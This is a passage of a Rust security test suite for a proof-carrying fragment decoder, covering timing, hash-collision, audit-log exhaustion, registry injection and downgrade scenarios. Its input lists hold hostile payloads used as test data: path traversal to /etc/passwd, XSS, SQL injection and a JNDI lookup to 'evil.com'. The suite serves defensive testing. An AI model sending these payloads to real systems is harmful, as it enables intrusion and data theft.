            format!("{}0", "a".repeat(63)),
            format!("{}{}0", "a".repeat(32), "b".repeat(31)),

            // Mixed case attempts (invalid format, should fail fast)
            "AAAA".repeat(16),
            "aAAA".repeat(16),

            // Length variations
            "short",
            "a".repeat(128), // Double length
            "",

            // Unicode injection attempts
            "test\u{202E}gnicnuob\u{202D}signature",
            "sig\u{0000}null\u{FEFF}nature",

            // Control character injection
            "sig\r\n\t\x08nature",
            "sig\x00\x01\x02nature",
        ];

        let samples_per_signature = 30;
        let mut timing_results = HashMap::new();

        for signature in signature_attack_vectors {
            let mut durations = Vec::new();

            for _ in 0..samples_per_signature {
                let attack_proof = RepairProof {
                    fragment_hashes: proof_template.fragment_hashes.clone(),
                    algorithm_id: proof_template.algorithm_id,
                    output_hash: proof_template.output_hash.clone(),
                    attestation_signature: signature.clone(),
                };

                let start = std::time::Instant::now();
                let _result = decoder.decode_with_proof(
                    &test_fragments,
                    &attack_proof,
                    "timing-attack-test".to_string(),
                );
                durations.push(start.elapsed());
            }

            let avg_duration = durations.iter().sum::<std::time::Duration>() / samples_per_signature as u32;
            timing_results.insert(signature.clone(), avg_duration);
        }

        // Analyze timing variance to detect potential timing leaks
        let durations: Vec<_> = timing_results.values().cloned().collect();
        let min_time = durations.iter().min().unwrap();
        let max_time = durations.iter().max().unwrap();

        let timing_variance = max_time.as_nanos() as f64 / min_time.as_nanos() as f64;

        // Log results for analysis
        eprintln!("Signature timing analysis ({}x variance):", timing_variance);
        for (sig_prefix, duration) in timing_results.iter() {
            let display_sig = if sig_prefix.len() > 16 {
                format!("{}...", &sig_prefix[..16])
            } else {
                sig_prefix.clone()
            };
            eprintln!("  {}: {:?}", display_sig.escape_debug(), duration);
        }

        // Conservative threshold for timing attack resistance
        assert!(timing_variance < 3.0,
            "Signature verification timing variance too high: {:.2}x (min: {:?}, max: {:?})",
            timing_variance, min_time, max_time);
    }

    #[test]
    fn negative_fragment_hash_collision_and_preimage_attack_resistance() {
        let decoder = ProofCarryingDecoder::new(DecoderConfig {
            mode: ProofVerificationMode::Mandatory,
            max_audit_entries: DEFAULT_MAX_AUDIT_LOG_ENTRIES,
            audit_rotation_threshold: 500,
        });

        // Test hash collision resistance with carefully crafted fragment data
        let collision_attack_fragments = vec![
            // Length extension attacks
            (b"data".to_vec(), b"data\x00padding".to_vec()),
            (b"key=value".to_vec(), b"key=value&".to_vec()),
            (b"fragment".to_vec(), b"fragment\x01\x02\x03".to_vec()),

            // Unicode normalization attacks
            ("test".as_bytes().to_vec(), "te\u{0301}st".as_bytes().to_vec()),
            ("file".as_bytes().to_vec(), "file\u{200B}".as_bytes().to_vec()),

            // Boundary condition attacks
            (b"".to_vec(), b"\x00".to_vec()),
            (b"a".to_vec(), b"\x61".to_vec()),
            (b"123".to_vec(), b"123\x00".to_vec()),

            // Hash function domain attacks
            (b"repair_proof_v1:data".to_vec(), b"different:repair_proof_v1:data".to_vec()),
            (b"normal_fragment".to_vec(), b"repair_proof_v1:normal_fragment".to_vec()),

            // Multi-byte sequence attacks
            (vec![0x41, 0x42], vec![0x41, 0x42, 0x00]),
            (vec![0xFF, 0xFE], vec![0xFF, 0xFE, 0xFD]),

            // Very similar binary data
            (vec![0x01; 1000], vec![0x02; 1000]),
            ((0..255).collect(), (1..=255).collect()),
        ];

        let mut seen_hashes = HashSet::new();
        let mut collision_tests = Vec::new();

        for (fragment1, fragment2) in collision_attack_fragments {
            let hash1 = compute_fragment_hash(&fragment1);
            let hash2 = compute_fragment_hash(&fragment2);

            // Verify no hash collisions
            assert_ne!(hash1, hash2,
                "Hash collision detected between fragments: {:?} vs {:?}",
                fragment1, fragment2);

            // Verify hashes are well-distributed
            assert!(seen_hashes.insert(hash1.clone()),
                "Duplicate hash {} for fragment {:?}", hash1, fragment1);
            assert!(seen_hashes.insert(hash2.clone()),
                "Duplicate hash {} for fragment {:?}", hash2, fragment2);

            collision_tests.push((fragment1, fragment2, hash1, hash2));
        }

        // Test that different fragments produce different repair outcomes
        for (fragment1, fragment2, hash1, hash2) in collision_tests {
            let proof1 = RepairProof {
                fragment_hashes: vec![hash1.clone()],
                algorithm_id: RepairAlgorithm::ReedSolomonRS255_223,
                output_hash: compute_fragment_hash(&fragment1),
                attestation_signature: "test_signature".repeat(4),
            };

            let proof2 = RepairProof {
                fragment_hashes: vec![hash2.clone()],
                algorithm_id: RepairAlgorithm::ReedSolomonRS255_223,
                output_hash: compute_fragment_hash(&fragment2),
                attestation_signature: "test_signature".repeat(4),
            };

            let result1 = decoder.decode_with_proof(
                &[fragment1.clone()],
                &proof1,
                "collision-test-1".to_string(),
            );

            let result2 = decoder.decode_with_proof(
                &[fragment2.clone()],
                &proof2,
                "collision-test-2".to_string(),
            );

            // Results should be distinguishable (different outcomes or different evidence)
            match (result1, result2) {
                (Ok(outcome1), Ok(outcome2)) => {
                    assert_ne!(outcome1.output_hash, outcome2.output_hash,
                        "Different fragments should produce different output hashes");
                }
                _ => {
                    // Different success/failure patterns are also acceptable
                }
            }
        }

        println!("Hash collision resistance verified for {} unique fragment hashes", seen_hashes.len());
    }

    #[test]
    fn negative_audit_log_memory_exhaustion_and_rotation_attack_resistance() {
        let decoder = ProofCarryingDecoder::new(DecoderConfig {
            mode: ProofVerificationMode::Advisory, // Allow operations to proceed
            max_audit_entries: 100, // Small limit for testing
            audit_rotation_threshold: 50, // Trigger rotation early
        });

        // Test 1: Rapid audit log generation (memory exhaustion attempt)
        for i in 0..1000 {
            let fragment = vec![i as u8; 100];
            let proof = RepairProof {
                fragment_hashes: vec![compute_fragment_hash(&fragment)],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: compute_fragment_hash(&fragment),
                attestation_signature: format!("rapid_attack_signature_{}", i),
            };

            let _result = decoder.decode_with_proof(
                &[fragment],
                &proof,
                format!("memory_exhaustion_test_{}", i),
            );

            // Verify audit log doesn't grow unbounded
            let audit_log = decoder.audit_log();
            assert!(audit_log.len() <= 100,
                "Audit log exceeded maximum entries: {} > 100", audit_log.len());
        }

        // Test 2: Audit log rotation consistency under concurrent access
        let decoder_arc = Arc::new(ProofCarryingDecoder::new(DecoderConfig {
            mode: ProofVerificationMode::Advisory,
            max_audit_entries: 50,
            audit_rotation_threshold: 25,
        }));

        let results = Arc::new(Mutex::new(Vec::new()));

        // Spawn multiple threads generating audit entries concurrently
        let handles: Vec<_> = (0..20).map(|thread_id| {
            let decoder_clone = decoder_arc.clone();
            let results_clone = results.clone();

            thread::spawn(move || {
                for i in 0..25 {
                    let fragment = vec![(thread_id + i) as u8; 50];
                    let proof = RepairProof {
                        fragment_hashes: vec![compute_fragment_hash(&fragment)],
                        algorithm_id: RepairAlgorithm::XorRecovery,
                        output_hash: compute_fragment_hash(&fragment),
                        attestation_signature: format!("concurrent_sig_{}_{}", thread_id, i),
                    };

                    let result = decoder_clone.decode_with_proof(
                        &[fragment],
                        &proof,
                        format!("concurrent_test_{}_{}", thread_id, i),
                    );

                    let audit_len = decoder_clone.audit_log().len();
                    results_clone.lock().unwrap().push((thread_id, i, audit_len, result.is_ok()));
                }
            })
        }).collect();

        // Wait for all threads
        for handle in handles {
            handle.join().expect("Thread should complete");
        }

        let final_results = results.lock().unwrap();
        let final_audit_log = decoder_arc.audit_log();

        // Verify audit log bounds maintained under concurrent stress
        assert!(final_audit_log.len() <= 50,
            "Final audit log exceeded bounds: {} > 50", final_audit_log.len());

        // Verify no data corruption in audit entries
        for entry in &final_audit_log {
            assert!(!entry.event_code.is_empty(), "Event code should not be empty");
            assert!(entry.timestamp_epoch_secs > 0, "Timestamp should be positive");
            assert!(!entry.operation_id.is_empty(), "Operation ID should not be empty");
        }

        // Verify all threads completed successfully
        assert_eq!(final_results.len(), 20 * 25, "All operations should have completed");

        println!("Concurrent audit log test: {} operations, final log size: {}",
            final_results.len(), final_audit_log.len());
    }

    #[test]
    fn negative_algorithm_registry_capacity_overflow_and_injection_attacks() {
        let mut decoder = ProofCarryingDecoder::new(DecoderConfig {
            mode: ProofVerificationMode::Mandatory,
            max_audit_entries: DEFAULT_MAX_AUDIT_LOG_ENTRIES,
            audit_rotation_threshold: 500,
        });

        // Test algorithm registration capacity limits
        let initial_count = decoder.registered_algorithms().len();

        // Attempt to register maximum allowed algorithms
        for i in 0..MAX_REGISTERED_ALGORITHMS {
            let algorithm = RepairAlgorithm::Custom(format!("overflow_test_algorithm_{}", i));
            let result = decoder.register_algorithm(algorithm);

            if i + initial_count < MAX_REGISTERED_ALGORITHMS {
                assert!(result.is_ok(),
                    "Should be able to register algorithm {} (total: {})",
                    i, i + initial_count);
            } else {
                assert!(result.is_err(),
                    "Should reject algorithm registration beyond capacity: {}", i);
                break;
            }
        }

        // Verify capacity limits enforced
        let final_count = decoder.registered_algorithms().len();
        assert!(final_count <= MAX_REGISTERED_ALGORITHMS,
            "Algorithm count should not exceed maximum: {} > {}",
            final_count, MAX_REGISTERED_ALGORITHMS);

        // Test malicious algorithm identifier injection
        let malicious_algorithm_ids = vec![
            // Control character injection
            "algorithm\r\nInjected\x00Content",
            "algo\x08\x08\x08attack",
            "test\x1b[31mRED\x1b[0malgo",

            // Unicode attacks
            "algo\u{202E}dooG\u{202D}Bad",
            "test\u{FEFF}\u{200B}hidden",
            "algo\u{10FFFF}\u{E000}private",

            // Path traversal attempts
            "../../../etc/passwd",
            "..\\windows\\system32\\config",
            "algo/../../inject",

            // XSS/injection patterns
            "<script>alert('xss')</script>",
            "'; DROP TABLE algorithms; --",
            "${jndi:ldap://evil.com/}",

            // Very long identifiers
            "x".repeat(100_000),
            "\u{1F4A9}".repeat(10_000), // Emoji bomb

            // Empty and whitespace
            "",
            " ",
            "\t\r\n",
        ];

        for malicious_id in malicious_algorithm_ids {
            let result = decoder.register_algorithm(RepairAlgorithm::Custom(malicious_id.to_string()));

            match result {
                Ok(_) => {
                    // If registration succeeds, verify it's stored safely
                    let algorithms = decoder.registered_algorithms();
                    let found = algorithms.iter().any(|algo| {
                        if let RepairAlgorithm::Custom(id) = algo {
                            id == malicious_id
                        } else {
                            false
                        }
                    });

                    if found {
                        // Verify malicious content is preserved exactly (no normalization)
                        assert!(algorithms.len() <= MAX_REGISTERED_ALGORITHMS,
                            "Algorithm list should remain bounded");
                    }
                }
                Err(_) => {
                    // Rejection of malicious input is also acceptable
                }
            }
        }

        // Test algorithm deregistration with malicious IDs
        for malicious_id in ["../../../algo", "algo\x00injection"] {
            let _result = decoder.deregister_algorithm(&RepairAlgorithm::Custom(malicious_id.to_string()));
            // Should not crash or cause issues regardless of outcome
        }

        // Verify final state consistency
        let final_algorithms = decoder.registered_algorithms();
        for algorithm in &final_algorithms {
            if let RepairAlgorithm::Custom(id) = algorithm {
                // All registered IDs should be non-empty after filtering
                assert!(!id.is_empty(), "Algorithm ID should not be empty in final state");
            }
        }

        println!("Algorithm registry attack test completed with {} algorithms registered",
            final_algorithms.len());
    }

    #[test]
    fn negative_proof_verification_state_corruption_and_recovery_comprehensive() {
        let decoder = ProofCarryingDecoder::new(DecoderConfig {
            mode: ProofVerificationMode::Mandatory,
            max_audit_entries: DEFAULT_MAX_AUDIT_LOG_ENTRIES,
            audit_rotation_threshold: 500,
        });

        // Test proof verification with corrupted internal state scenarios
        let base_fragment = b"state_corruption_test".to_vec();
        let base_hash = compute_fragment_hash(&base_fragment);

        let corruption_scenarios = vec![
            // Hash mismatch corruption
            RepairProof {
                fragment_hashes: vec![base_hash.clone()],
                algorithm_id: RepairAlgorithm::ReedSolomonRS255_223,
                output_hash: "f".repeat(64), // Deliberate mismatch
                attestation_signature: "corruption_test_1".repeat(4),
            },

            // Algorithm mismatch corruption
            RepairProof {
                fragment_hashes: vec!["0".repeat(64)], // Wrong hash
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: base_hash.clone(),
                attestation_signature: "corruption_test_2".repeat(4),
            },

            // Empty/malformed proof fields
            RepairProof {
                fragment_hashes: vec![], // Empty hashes
                algorithm_id: RepairAlgorithm::ReedSolomonRS255_223,
                output_hash: base_hash.clone(),
                attestation_signature: "corruption_test_3".repeat(4),
            },

            // Signature corruption with various patterns
            RepairProof {
                fragment_hashes: vec![base_hash.clone()],
                algorithm_id: RepairAlgorithm::ReedSolomonRS255_223,
                output_hash: base_hash.clone(),
                attestation_signature: "".to_string(), // Empty signature
            },

            // Very long corrupted fields
            RepairProof {
                fragment_hashes: vec!["x".repeat(10000)], // Extremely long hash
                algorithm_id: RepairAlgorithm::ReedSolomonRS255_223,
                output_hash: "y".repeat(10000), // Extremely long output hash
                attestation_signature: "z".repeat(10000), // Extremely long signature
            },
        ];

        // Test each corruption scenario multiple times for consistency
        let iterations_per_scenario = 5;
        let mut scenario_results = Vec::new();

        for (scenario_idx, corrupted_proof) in corruption_scenarios.iter().enumerate() {
            let mut iteration_results = Vec::new();

            for iteration in 0..iterations_per_scenario {
                let result = decoder.decode_with_proof(
                    &[base_fragment.clone()],
                    corrupted_proof,
                    format!("corruption_scenario_{}_{}", scenario_idx, iteration),
                );

                iteration_results.push((iteration, result));
            }

            scenario_results.push((scenario_idx, iteration_results));
        }

        // Verify corruption handling consistency
        for (scenario_idx, iteration_results) in scenario_results {
            let first_result = &iteration_results[0].1;

            for (iteration, result) in iteration_results.iter().skip(1) {
                match (first_result, result) {
                    (Ok(first_outcome), Ok(outcome)) => {
                        // If both succeed, outcomes should be identical
                        assert_eq!(first_outcome.output_hash, outcome.output_hash,
                            "Inconsistent outcome in scenario {} iteration {}", scenario_idx, iteration);
                    }
                    (Err(_), Err(_)) => {
                        // Consistent failure is expected for corrupted proofs
                    }
                    _ => {
                        // Inconsistent success/failure could indicate state corruption
                        panic!("Inconsistent result type in scenario {} iteration {}: first={:?}, current={:?}",
                            scenario_idx, iteration, first_result.is_ok(), result.is_ok());
                    }
                }
            }
        }

        // Test state recovery after corruption
        let valid_proof = RepairProof {
            fragment_hashes: vec![base_hash.clone()],
            algorithm_id: RepairAlgorithm::XorRecovery,
            output_hash: base_hash.clone(),
            attestation_signature: "valid_recovery_test".repeat(4),
        };

        // Interleave corrupted and valid proofs to test recovery
        for i in 0..10 {
            // Process corrupted proof
            let _corrupt_result = decoder.decode_with_proof(
                &[base_fragment.clone()],
                &corruption_scenarios[i % corruption_scenarios.len()],
                format!("interleaved_corrupt_{}", i),
            );

            // Process valid proof - should work consistently
            let valid_result = decoder.decode_with_proof(
                &[base_fragment.clone()],
                &valid_proof,
                format!("interleaved_valid_{}", i),
            );

            // Valid proofs should continue to work after corruption attempts
            match valid_result {
                Ok(outcome) => {
                    assert_eq!(outcome.output_hash, base_hash,
                        "Valid proof should produce expected outcome after corruption {}", i);
                }
                Err(e) => {
                    panic!("Valid proof failed after corruption scenario {}: {:?}", i, e);
                }
            }
        }

        // Verify final audit log integrity
        let final_audit = decoder.audit_log();
        assert!(final_audit.len() <= DEFAULT_MAX_AUDIT_LOG_ENTRIES,
            "Audit log should remain bounded after corruption tests");

        for entry in final_audit.iter() {
            assert!(!entry.event_code.is_empty(), "All audit entries should have valid event codes");
            assert!(entry.timestamp_epoch_secs > 0, "All audit entries should have valid timestamps");
        }

        println!("Proof verification corruption resistance test completed successfully");
    }

    #[test]
    fn negative_decoder_configuration_boundary_injection_and_overflow_comprehensive() {
        // Test extreme and malicious decoder configurations
        let extreme_configs = vec![
            // Zero-capacity configurations
            DecoderConfig {
                mode: ProofVerificationMode::Mandatory,
                max_audit_entries: 0,
                audit_rotation_threshold: 0,
            },

            // Maximum capacity stress test
            DecoderConfig {
                mode: ProofVerificationMode::Advisory,
                max_audit_entries: usize::MAX,
                audit_rotation_threshold: usize::MAX,
            },

            // Inverted thresholds (rotation > max)
            DecoderConfig {
                mode: ProofVerificationMode::Mandatory,
                max_audit_entries: 100,
                audit_rotation_threshold: 1000, // Greater than max
            },

            // Minimum positive values
            DecoderConfig {
                mode: ProofVerificationMode::Advisory,
                max_audit_entries: 1,
                audit_rotation_threshold: 1,
            },

            // Very large rotation threshold
            DecoderConfig {
                mode: ProofVerificationMode::Mandatory,
                max_audit_entries: 1000,
                audit_rotation_threshold: usize::MAX - 1,
            },
        ];

        for (config_idx, config) in extreme_configs.iter().enumerate() {
            // Creating decoder should handle extreme configs gracefully
            let decoder = ProofCarryingDecoder::new(config.clone());

            // Test basic operations with extreme configuration
            let test_fragment = vec![(config_idx as u8); 100];
            let test_hash = compute_fragment_hash(&test_fragment);

            let test_proof = RepairProof {
                fragment_hashes: vec![test_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: test_hash.clone(),
                attestation_signature: format!("extreme_config_test_{}", config_idx),
            };

            // Should handle operations without crashing
            let result = decoder.decode_with_proof(
                &[test_fragment],
                &test_proof,
                format!("extreme_config_operation_{}", config_idx),
            );

            // Verify audit log respects configuration bounds
            let audit_log = decoder.audit_log();
            if config.max_audit_entries > 0 {
                assert!(audit_log.len() <= config.max_audit_entries,
                    "Config {}: audit log {} exceeds max {}",
                    config_idx, audit_log.len(), config.max_audit_entries);
            } else {
                // Zero capacity should result in empty log
                assert!(audit_log.is_empty(),
                    "Config {}: zero capacity should produce empty log", config_idx);
            }

            // Verify operation outcome consistency regardless of config
            match result {
                Ok(outcome) => {
                    assert_eq!(outcome.output_hash, test_hash,
                        "Config {}: outcome should be deterministic", config_idx);
                }
                Err(_) => {
                    // Some extreme configs may cause operations to fail, which is acceptable
                }
            }

            println!("Extreme config {} handled successfully", config_idx);
        }

        // Test configuration mutation during operation
        let mutable_decoder = ProofCarryingDecoder::new(DecoderConfig {
            mode: ProofVerificationMode::Advisory,
            max_audit_entries: 100,
            audit_rotation_threshold: 50,
        });

        // Perform operations before, during, and after configuration stress
        let consistent_fragment = b"config_mutation_test".to_vec();
        let consistent_hash = compute_fragment_hash(&consistent_fragment);
        let consistent_proof = RepairProof {
            fragment_hashes: vec![consistent_hash.clone()],
            algorithm_id: RepairAlgorithm::XorRecovery,
            output_hash: consistent_hash.clone(),
            attestation_signature: "config_mutation_test".repeat(4),
        };

        // Baseline operation
        let baseline_result = mutable_decoder.decode_with_proof(
            &[consistent_fragment.clone()],
            &consistent_proof,
            "baseline_operation".to_string(),
        );

        // Multiple operations with the same decoder instance
        for i in 0..20 {
            let iteration_result = mutable_decoder.decode_with_proof(
                &[consistent_fragment.clone()],
                &consistent_proof,
                format!("iteration_operation_{}", i),
            );

            // Results should be consistent across iterations
            match (&baseline_result, &iteration_result) {
                (Ok(baseline), Ok(iteration)) => {
                    assert_eq!(baseline.output_hash, iteration.output_hash,
                        "Iteration {}: output hash should be consistent", i);
                }
                (Err(_), Err(_)) => {
                    // Consistent failure is also acceptable
                }
                _ => {
                    panic!("Iteration {}: inconsistent result type", i);
                }
            }
        }

        println!("Decoder configuration boundary testing completed successfully");
    }

    #[test]
    fn negative_fragment_data_encoding_and_binary_corruption_comprehensive() {
        let decoder = ProofCarryingDecoder::new(DecoderConfig {
            mode: ProofVerificationMode::Mandatory,
            max_audit_entries: DEFAULT_MAX_AUDIT_LOG_ENTRIES,
            audit_rotation_threshold: 500,
        });

        // Test various binary corruption and encoding attack vectors
        let encoding_attack_fragments = vec![
            // Binary corruption patterns
            vec![0x00; 1000], // All null bytes
            vec![0xFF; 1000], // All 0xFF bytes
            (0..=255).cycle().take(1000).collect::<Vec<u8>>(), // Repeating pattern

            // UTF-8 boundary attacks
            vec![0xC0, 0x80], // Overlong encoding for null
            vec![0xED, 0xA0, 0x80], // High surrogate
            vec![0xED, 0xBF, 0xBF], // Low surrogate
            vec![0xF4, 0x90, 0x80, 0x80], // Beyond Unicode range

            // Binary patterns that could exploit parsers
            b"\xFF\xFE\x00\x00".to_vec(), // BOM variants
            b"\xEF\xBB\xBF".to_vec(), // UTF-8 BOM
            b"\x00\x00\xFE\xFF".to_vec(), // UTF-32 BOM

            // Control character floods
            vec![0x01; 1000], // SOH flood
            vec![0x1A; 1000], // SUB flood
            vec![0x7F; 1000], // DEL flood

            // Mixed binary/text corruption
            b"normal_text\x00\xFF\xFE\x00corrupt".to_vec(),
            b"\xDE\xAD\xBE\xEF".to_vec(), // Classic hex pattern
            b"valid_start\x00\x00\x00\x00\x00".to_vec(),

            // Extremely short and long patterns
            vec![], // Empty
            vec![0x42], // Single byte
            vec![0x42; 1_000_000], // 1MB of same byte

            // Patterns that could trigger integer overflows
            vec![0x80; 1000], // High bit set
            vec![0x40; 1000], // Pattern that could cause shifts
            vec![0x21; 1000], // Printable pattern
        ];

        let mut processed_fragments = 0;
        let mut successful_repairs = 0;
        let mut detected_corruptions = 0;

        for (fragment_idx, fragment_data) in encoding_attack_fragments.iter().enumerate() {
            let fragment_hash = compute_fragment_hash(fragment_data);

            let repair_proof = RepairProof {
                fragment_hashes: vec![fragment_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: fragment_hash.clone(),
                attestation_signature: format!("encoding_attack_{}", fragment_idx),
            };

            let result = decoder.decode_with_proof(
                &[fragment_data.clone()],
                &repair_proof,
                format!("encoding_test_{}", fragment_idx),
            );

            processed_fragments = processed_fragments.saturating_add(1);

            match result {
                Ok(outcome) => {
                    successful_repairs = successful_repairs.saturating_add(1);

                    // Verify output hash consistency
                    assert_eq!(outcome.output_hash, fragment_hash,
                        "Fragment {}: output hash should match expected", fragment_idx);

                    // Verify no memory corruption indicators
                    let audit_log = decoder.audit_log();
                    assert!(audit_log.len() <= DEFAULT_MAX_AUDIT_LOG_ENTRIES,
                        "Fragment {}: audit log should remain bounded", fragment_idx);

                    // Check for corruption detection in audit
                    let has_corruption_event = audit_log.iter().any(|entry| {
                        entry.event_code == REPAIR_PROOF_INVALID ||
                        entry.event_code == REPAIR_PROOF_MISSING
                    });

                    if has_corruption_event {
                        detected_corruptions = detected_corruptions.saturating_add(1);
                    }
                }
                Err(_) => {
                    // Failure to process corrupted data is acceptable
                    detected_corruptions = detected_corruptions.saturating_add(1);
                }
            }

            // Test that processing corrupted fragments doesn't affect subsequent valid operations
            let clean_fragment = format!("clean_test_{}", fragment_idx).into_bytes();
            let clean_hash = compute_fragment_hash(&clean_fragment);
            let clean_proof = RepairProof {
                fragment_hashes: vec![clean_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: clean_hash.clone(),
                attestation_signature: format!("clean_followup_{}", fragment_idx),
            };

            let clean_result = decoder.decode_with_proof(
                &[clean_fragment],
                &clean_proof,
                format!("clean_followup_{}", fragment_idx),
            );

            assert!(clean_result.is_ok(),
                "Fragment {}: clean operation should succeed after corruption test", fragment_idx);
        }

        println!("Binary corruption test completed: {} fragments processed, {} successful, {} corruptions detected",
            processed_fragments, successful_repairs, detected_corruptions);

        // Verify final state consistency
        let final_audit = decoder.audit_log();
        for (idx, entry) in final_audit.iter().enumerate() {
            assert!(!entry.event_code.is_empty(),
                "Audit entry {}: event code should not be empty", idx);
            assert!(entry.timestamp_epoch_secs > 0,
                "Audit entry {}: timestamp should be positive", idx);
        }

        // Should have detected some corruptions
        assert!(detected_corruptions > 0,
            "Should have detected at least some corruptions in the test data");
    }

    // ═══ EXTREME ADVERSARIAL NEGATIVE-PATH TESTS ═══
    // These tests target sophisticated attack vectors against proof-carrying decode systems

    #[test]
    fn test_extreme_adversarial_proof_collision_birthday_attack() {
        // Simulate birthday attack against proof verification where attacker
        // attempts to generate colliding proof hashes to bypass signature verification
        let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test-signer", "collision-key");

        // Generate base legitimate proof
        let legitimate_fragment = b"legitimate_repair_data";
        let legit_hash = compute_fragment_hash(legitimate_fragment);
        let legitimate_proof = RepairProof {
            fragment_hashes: vec![legit_hash.clone()],
            algorithm_id: RepairAlgorithm::XorRecovery,
            output_hash: legit_hash.clone(),
            attestation_signature: "legitimate_signature".to_string(),
        };

        // Attempt birthday attack with collision candidates
        let collision_attempts = [
            b"malicious_repair_data_v1" as &[u8],
            b"malicious_repair_data_v2",
            b"malicious_repair_data_v3",
            b"evil_fragment_collision_a",
            b"evil_fragment_collision_b",
            b"collision_candidate_00001",
            b"collision_candidate_00002",
            b"hash_collision_exploit_v1",
            b"hash_collision_exploit_v2",
            b"birthday_attack_fragment_a",
            b"birthday_attack_fragment_b",
        ];

        let mut collision_detected = false;
        for (attempt_idx, malicious_fragment) in collision_attempts.iter().enumerate() {
            let malicious_hash = compute_fragment_hash(malicious_fragment);

            // Create malicious proof attempting to reuse legitimate signature
            let malicious_proof = RepairProof {
                fragment_hashes: vec![malicious_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: malicious_hash.clone(),
                attestation_signature: legitimate_proof.attestation_signature.clone(), // Reuse signature
            };

            // Test collision resistance
            let result = decoder.decode_with_proof(
                &[malicious_fragment.to_vec()],
                &malicious_proof,
                format!("collision_attack_{}", attempt_idx),
            );

            // Verify that collision attack fails
            if result.is_ok() {
                // If any succeed, check if it's actually a hash collision
                if malicious_hash == legit_hash {
                    collision_detected = true;
                    panic!("CRITICAL: Hash collision detected between legitimate and malicious fragments!");
                }
                // Even without collision, reused signature should fail
                panic!("SECURITY VIOLATION: Malicious proof with reused signature was accepted!");
            }
        }

        // Verify legitimate proof still works
        let legit_result = decoder.decode_with_proof(
            &[legitimate_fragment.to_vec()],
            &legitimate_proof,
            "legitimate_operation".to_string(),
        );
        assert!(legit_result.is_ok(), "Legitimate proof should still be accepted");

        // Document that no collisions were found (this is expected/desired)
        assert!(!collision_detected, "No hash collisions should be found in this test");
    }

    #[test]
    fn test_extreme_adversarial_fragment_substitution_timing_attack() {
        // Test timing attack where attacker measures decode timing to infer
        // information about legitimate fragments or discover algorithm weaknesses
        let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "timing-signer", "timing-key");

        // Create baseline fragment for timing comparison
        let baseline_fragment = vec![0x42; 1024]; // Known pattern
        let baseline_hash = compute_fragment_hash(&baseline_fragment);
        let baseline_proof = RepairProof {
            fragment_hashes: vec![baseline_hash.clone()],
            algorithm_id: RepairAlgorithm::XorRecovery,
            output_hash: baseline_hash.clone(),
            attestation_signature: "baseline_timing_sig".to_string(),
        };

        // Test various fragment patterns that might reveal timing information
        let timing_attack_fragments = vec![
            // Constant patterns (might be faster/slower to process)
            vec![0x00; 1024], // All zeros
            vec![0xFF; 1024], // All ones
            vec![0xAA; 1024], // Alternating pattern
            vec![0x55; 1024], // Inverse alternating
            // Specific bit patterns that might trigger algorithmic edge cases
            (0..1024).map(|i| (i % 256) as u8).collect::<Vec<_>>(), // Sequential
            (0..1024).map(|i| ((i * 17) % 256) as u8).collect::<Vec<_>>(), // Pseudo-random
            // Patterns designed to trigger worst-case complexity
            vec![0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80].repeat(128), // Powers of 2
            // Hash collision attempts
            b"timing_attack_probe_0001".to_vec(),
            b"timing_attack_probe_0002".to_vec(),
        ];

        for (pattern_idx, fragment) in timing_attack_fragments.iter().enumerate() {
            let fragment_hash = compute_fragment_hash(fragment);
            let attack_proof = RepairProof {
                fragment_hashes: vec![fragment_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: fragment_hash.clone(),
                attestation_signature: format!("timing_attack_sig_{}", pattern_idx),
            };

            // Attempt to process timing attack fragment
            let result = decoder.decode_with_proof(
                &[fragment.clone()],
                &attack_proof,
                format!("timing_attack_trace_{}", pattern_idx),
            );

            // Verify that timing attack fragments are processed correctly without leaking info
            // Note: We can't easily test actual timing in unit tests, but we ensure
            // the operations complete without exposing internal state
            match result {
                Ok(_) => {
                    // Success should not reveal timing-sensitive information
                    // Verify audit log doesn't leak internal timing details
                    let audit_entries = decoder.audit_log();
                    for entry in audit_entries.iter() {
                        assert!(!entry.event_code.contains("TIMING"),
                            "Audit log should not contain timing-sensitive information");
                        assert!(!entry.trace_id.contains("duration"),
                            "Trace ID should not contain timing information");
                    }
                },
                Err(e) => {
                    // Errors should not reveal timing-sensitive details
                    assert!(!e.message().contains("took"),
                        "Error message should not contain timing information");
                    assert!(!e.message().contains("duration"),
                        "Error message should not contain duration information");
                    assert!(!e.message().contains("timeout"),
                        "Error message should not leak timeout details");
                }
            }
        }

        // Verify baseline fragment still processes normally after timing attacks
        let baseline_result = decoder.decode_with_proof(
            &[baseline_fragment],
            &baseline_proof,
            "post_timing_attack_baseline".to_string(),
        );

        assert!(baseline_result.is_ok() || baseline_result.is_err(),
            "Baseline operation should complete deterministically after timing attacks");
    }

    #[test]
    fn test_extreme_adversarial_algorithm_downgrade_exploit() {
        // Test algorithm downgrade attack where attacker forces use of weaker
        // reconstruction algorithms to exploit known vulnerabilities
        let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "downgrade-signer", "downgrade-key");

        // Register multiple algorithms with different security properties
        decoder.register_algorithm(AlgorithmId::new("secure_v2"));
        decoder.register_algorithm(AlgorithmId::new("legacy_v1"));
        decoder.register_algorithm(AlgorithmId::new("deprecated_v0"));

        let test_fragment = b"sensitive_repair_data";
        let fragment_hash = compute_fragment_hash(test_fragment);

        // Attempt downgrade attack by forcing use of deprecated algorithm
        let downgrade_attacks = [
            ("deprecated_v0", "DOWNGRADE: Attempting to force deprecated algorithm"),
            ("legacy_v1", "DOWNGRADE: Attempting to force legacy algorithm"),
            ("unknown_weak", "DOWNGRADE: Attempting to force unknown weak algorithm"),
            ("", "DOWNGRADE: Attempting to force empty algorithm identifier"),
            ("secure_v2\x00deprecated_v0", "DOWNGRADE: Null byte injection attack"),
            ("secure_v2/../deprecated_v0", "DOWNGRADE: Path traversal in algorithm ID"),
            ("SECURE_V2", "DOWNGRADE: Case manipulation attack"),
            ("secure_v2 ", "DOWNGRADE: Trailing whitespace attack"),
            (" secure_v2", "DOWNGRADE: Leading whitespace attack"),
        ];

